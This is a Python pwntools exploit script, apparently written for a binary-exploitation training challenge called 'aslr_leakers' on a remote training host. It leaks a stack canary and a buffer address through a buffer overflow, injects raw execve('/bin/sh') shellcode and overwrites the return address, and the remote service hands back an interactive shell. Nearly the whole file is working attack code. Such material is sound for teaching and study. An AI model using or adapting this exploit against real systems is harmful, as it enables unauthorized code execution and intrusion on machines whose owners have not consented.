from pwn import *

run_local = False
verbose = True


def obtain_address(location_offset):
    input("SEND BUFFER ADDRESS")
    # buffer = b"A"*(135) + b'S'
    buffer = b"A" * (BUF_SIZE + location_offset - 1) + b'S'
    p.send(buffer)  # LINE

    ret = p.recv_raw(200)

    # input("PRINT THE LEAK")
    print("------------")
    print(str(ret))

    print("------------")

    address_location_offset = ret.find(b'S')+1
    address_read_LSB = ret[address_location_offset:
                           address_location_offset+6] + b'\x00' * 2

    print("Address read LSB: " + str(address_read_LSB))

    address_INT = u64(address_read_LSB, endian="little") + 0x200720

    print("Address: " + str(hex(address_INT)))

    # with open('remote_address2.dat', 'wb') as f:
    #     f.write(p64(address_INT))
    # print("Address saved")
    # f.close()

    address_LSB = p64(address_INT)

    return address_LSB


# IDEA
# RETRIEVE THE CANARY


print("-----------------EXECUTION---------------------------------------")

# ----------------------EXECUTION-------------------------------------------

BUF_SIZE = 104
ADDRESS_OFFSET = 0x0

if run_local:
    s = ssh(host='localhost', user='acidburn', port=2222)
    p = s.process('./aslr_leakers')

    pid = gdb.attach(p)
else:
    p = remote("bin.training.jinblack.it", 2012)

input("Wait GDB to load and press ENTER")


print(p.recvline_endswith(b"!"))

# ------------------SEND FIRST NAME-------------------------------------------------

input("SEND SHELLCODE INSIDE NAME")
shellcode = b'\x48\xC7\xC0\x3B\x00\x00\x00\x48\x31\xF6\x48\x31\xD2\xEB\x03\x5F\x0F\x05\xE8\xF8\xFF\xFF\xFF/bin/sh\x00\x90'
p.sendline(shellcode)

# ------------------OBTAIN THE CANARY-------------------------------------------------


# here read the canary and then compare
input("SEND CANARY BUFFER")
buffer = b"A"*BUF_SIZE + b'S'
p.send(buffer)  # LINE

ret = p.recv_raw(200)

# input("PRINT THE LEAK")
print("------------")
print(str(ret))

print("------------")

canary_location_offset = ret.find(b'S')+1
canary = b'\x00' + ret[canary_location_offset:canary_location_offset+7]

# with open('canary.dat', 'wb') as f:
#     f.write(canary)
# print("Canary saved")
# f.close()


# ------------------OBTAIN BUFFER ADDRESS-------------------------------------------------
address_LSB = obtain_address(48)
input("WAIT")

# ------------------SHELLCODE CREATION-------------------------------------------------


# Internet shellcode
shellcode = BUF_SIZE * b'\x90' + canary + p64(0x1) + address_LSB
# b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + \

if verbose:
    print("Shellcode complete:")
    print(shellcode)

input("Send Shellcode")
p.send(shellcode)


p.interactive()
